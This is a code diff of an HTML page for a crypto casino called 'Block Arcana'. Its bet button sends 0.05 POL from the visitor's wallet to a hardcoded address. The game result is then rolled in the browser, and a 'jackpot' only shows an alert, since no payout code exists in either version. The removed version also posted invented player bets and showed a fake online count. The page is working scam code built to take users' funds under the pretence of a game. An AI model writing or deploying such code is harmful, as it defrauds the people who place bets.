@@ -3,167 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Block Arcana | Elite Crypto Casino</title>
+    <title>Block Arcana | Global Crypto Casino</title>
     <style>
         :root { --neon: #00ffff; --gold: #ff00ff; --win: #00ff00; }
         body {
             background: radial-gradient(circle at center, #111 0%, #050505 100%);
-            background-attachment: fixed; color: #fff;
-            font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0;
+            color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; margin: 0;
         }
-        .stats-header {
-            background: rgba(0, 255, 255, 0.05); border-bottom: 1px solid rgba(0, 255, 255, 0.2);
-            padding: 12px; font-size: 0.8em; display: flex; justify-content: space-around;
-            backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100;
+        .nav-header {
+            background: rgba(0,0,0,0.5); padding: 15px; display: flex; 
+            justify-content: space-between; align-items: center; border-bottom: 1px solid var(--neon);
         }
         .header {
-            font-family: serif; font-style: italic; font-size: 3.5em; margin: 20px 0;
+            font-family: serif; font-style: italic; font-size: 2.5em; margin: 20px 0;
             background: linear-gradient(to right, #fff, var(--gold), var(--neon), #fff);
             background-size: 200% auto; -webkit-background-clip: text;
             -webkit-text-fill-color: transparent; animation: shine 5s linear infinite;
         }
         @keyframes shine { to { background-position: 200% center; } }
         
-        /* Jackpot Card Pulsante */
         .jackpot-card {
-            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(0, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.03); border: 1px solid var(--neon);
             border-radius: 30px; padding: 30px; margin: 20px auto; max-width: 320px;
-            box-shadow: 0 0 20px rgba(0, 255, 255, 0.05);
-            animation: pulse 2s infinite;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.1);
         }
-        @keyframes pulse { 0% { box-shadow: 0 0 10px rgba(0,255,255,0.1); } 50% { box-shadow: 0 0 25px rgba(0,255,255,0.2); } 100% { box-shadow: 0 0 10px rgba(0,255,255,0.1); } }
-        
-        #jackpotValue { color: var(--win); font-size: 3em; font-weight: bold; text-shadow: 0 0 20px var(--win); margin: 10px 0; }
+        #jackpotValue { color: var(--win); font-size: 3em; font-weight: bold; text-shadow: 0 0 20px var(--win); }
 
-        /* Bouton Deluxe */
         .btn-bet {
             background: linear-gradient(135deg, var(--gold), #7000ff);
             border: none; padding: 22px 60px; color: white; font-weight: bold;
-            border-radius: 60px; cursor: pointer; font-size: 1.3em;
-            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.3); transition: 0.3s;
+            border-radius: 60px; cursor: pointer; font-size: 1.3em; margin: 20px 0;
         }
-        .btn-bet:disabled { background: #333; cursor: not-allowed; opacity: 0.7; }
+        .btn-bet:disabled { background: #333; opacity: 0.7; }
 
-        /* Tableau d'activité */
         .activity-box {
             background: rgba(255, 255, 255, 0.02); border-radius: 20px;
-            margin: 40px auto; max-width: 350px; padding: 15px;
-            border: 1px solid rgba(255,255,255,0.05); font-size: 0.8em;
+            margin: 20px auto; max-width: 350px; padding: 15px; border: 1px solid rgba(255,255,255,0.05);
         }
-        .activity-item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); color: #aaa; text-align: left; }
-        .activity-item b { color: var(--neon); }
-
-        .btn-scan {
-            display: inline-block; margin-top: 20px; padding: 10px 20px;
-            background: rgba(255,255,255,0.05); border: 1px solid var(--neon);
-            border-radius: 10px; color: var(--neon); text-decoration: none; font-size: 0.7em;
-        }
+        .activity-item { padding: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.8em; color: #aaa; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="stats-header">
-    <span>👥 <span id="online-players">28</span> EN LIGNE</span>
-    <span>💎 AMOY NETWORK</span>
+<div class="nav-header">
+    <div style="color: var(--neon); font-weight: bold;">BLOCK ARCANA</div>
+    <appkit-button></appkit-button> 
 </div>
 
 <div style="padding: 20px;">
     <h1 class="header">Block Arcana</h1>
     
     <div class="jackpot-card">
-        <div style="color: var(--neon); letter-spacing: 3px; font-size: 0.8em;">LIVE JACKPOT</div>
+        <div style="color: var(--neon); letter-spacing: 2px; font-size: 0.8em;">LIVE JACKPOT</div>
         <h2 id="jackpotValue">0.0500 POL</h2>
-        <div style="font-size: 0.7em; color: #888;">MIN BET: 0.05 POL</div>
     </div>
 
     <button class="btn-bet" id="betButton" onclick="playGame()">SPIN & BET</button>
-    <div id="status" style="margin-top: 15px; color: var(--neon); font-weight: bold; height: 20px;"></div>
+    <div id="status" style="color: var(--neon); font-weight: bold; height: 20px;"></div>
 
     <div class="activity-box">
-        <div style="font-weight: bold; margin-bottom: 10px; color: #fff;">RECENT ACTIVITY</div>
         <div id="activity-list">
-            <div class="activity-item">User <b>0x7a...d2</b> joined the room</div>
-            <div class="activity-item">User <b>0x12...f9</b> bet 0.05 POL</div>
+            <div class="activity-item">System: <b>Protocol ready</b>. Connect wallet to start.</div>
         </div>
     </div>
 
-    <a href="https://polygonscan.com/address/0x8e25e9858679f29193233f7d5d9939105408d257" target="_blank" class="btn-scan">🔍 VERIFY ON BLOCKCHAIN</a>
-    
-    <div style="margin-top: 40px; font-size: 0.7em; color: #444;">
-        STRICTLY DECENTRALIZED PROTOCOL v3.0<br>NO SIGN-UP REQUIRED.
-    </div>
+    <a href="https://polygonscan.com/address/0x8e25e9858679f29193233f7d5d9939105408d257" target="_blank" style="color: var(--neon); text-decoration: none; font-size: 0.7em;">🔍 LIVE BLOCKCHAIN SCAN</a>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+<script type="module">
+  import { createAppKit } from 'https://esm.sh/@reown/appkit'
+  import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
+  import { polygon } from 'https://esm.sh/@reown/appkit/networks'
 
-<script>
-    let currentJackpot = 0.0500;
-    const btn = document.getElementById("betButton");
+  const projectId = 'A26c2cef0fcf1c593197f7465d71c07e';
+
+  const metadata = {
+    name: 'Block Arcana',
+    description: 'Decentralized Casino',
+    url: 'https://arcana2026.github.io/Arcana/',
+    icons: ['https://avatars.githubusercontent.com/u/179229932']
+  }
+
+  const modal = createAppKit({
+    adapters: [new EthersAdapter()],
+    networks: [polygon],
+    metadata,
+    projectId,
+    features: { analytics: true }
+  })
+
+  // Logique de jeu intégrée
+  window.playGame = async () => {
     const status = document.getElementById("status");
+    const btn = document.getElementById("betButton");
+    
+    try {
+        const { address, isConnected } = modal.getAccount();
+        if (!isConnected) return modal.open();
 
-    function addActivity(text) {
-        const list = document.getElementById("activity-list");
-        const item = document.createElement("div");
-        item.className = "activity-item";
-        item.innerHTML = text;
-        list.prepend(item);
-        if(list.children.length > 4) list.removeChild(list.lastChild);
-    }
+        btn.disabled = true;
+        status.innerText = "CONFIRMATION...";
 
-    // Simulation de vie
-    setInterval(() => {
-        const users = ["0x88...12", "0x45...e4", "0xbc...d8", "0x33...a1"];
-        const user = users[Math.floor(Math.random()*users.length)];
-        addActivity(`User <b>${user}</b> just placed a bet`);
-    }, 12000);
+        const walletProvider = modal.getWalletProvider();
+        const ethersProvider = new ethers.providers.Web3Provider(walletProvider);
+        const signer = ethersProvider.getSigner();
 
-    async function playGame() {
-        if (!window.ethereum) return alert("Please open in MetaMask");
-        
-        try {
-            btn.disabled = true;
-            status.innerText = "WAITING FOR WALLET...";
-            
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            
-            const tx = { to: "0x8e25e9858679f29193233f7d5d9939105408d257", value: ethers.utils.parseEther("0.05") };
-            const transaction = await signer.sendTransaction(tx);
-            
-            status.innerText = "ROLLING THE DESTINY...";
-            await transaction.wait();
+        const tx = {
+            to: "0x8e25e9858679f29193233f7d5d9939105408d257",
+            value: ethers.utils.parseEther("0.05")
+        };
 
-            // EFFET DE SUSPENSE (3 secondes)
-            let count = 0;
-            const interval = setInterval(() => {
-                status.innerText = ["🎲 SPINNING.", "🎲 SPINNING..", "🎲 SPINNING..."][count % 3];
-                count++;
-            }, 500);
+        const transaction = await signer.sendTransaction(tx);
+        status.innerText = "SPINNING...";
+        await transaction.wait();
 
-            setTimeout(() => {
-                clearInterval(interval);
-                btn.disabled = false;
-                const roll = Math.floor(Math.random() * 50) + 1;
-                
-                if (roll === 7) {
-                    confetti({ particleCount: 200, spread: 90 });
-                    status.innerText = "🎰 JACKPOT !!!";
-                    alert("CONGRATULATIONS! YOU WON!");
-                } else {
-                    status.innerText = "NOT THIS TIME";
-                    currentJackpot += 0.05;
-                    document.getElementById("jackpotValue").innerText = currentJackpot.toFixed(4) + " POL";
-                    addActivity("<b>Jackpot</b> increased to " + currentJackpot.toFixed(2) + " POL");
-                }
-            }, 3000);
-
-        } catch (e) {
+        setTimeout(() => {
             btn.disabled = false;
-            status.innerText = "ERROR OR CANCELLED";
-        }
+            if (Math.floor(Math.random() * 50) + 1 === 7) {
+                alert("🎰 JACKPOT !");
+            } else {
+                status.innerText = "TRY AGAIN";
+                setTimeout(() => status.innerText = "", 3000);
+            }
+        }, 3000);
+
+    } catch (e) {
+        btn.disabled = false;
+        status.innerText = "ERROR";
     }
+  }
 </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </body>
 </html>
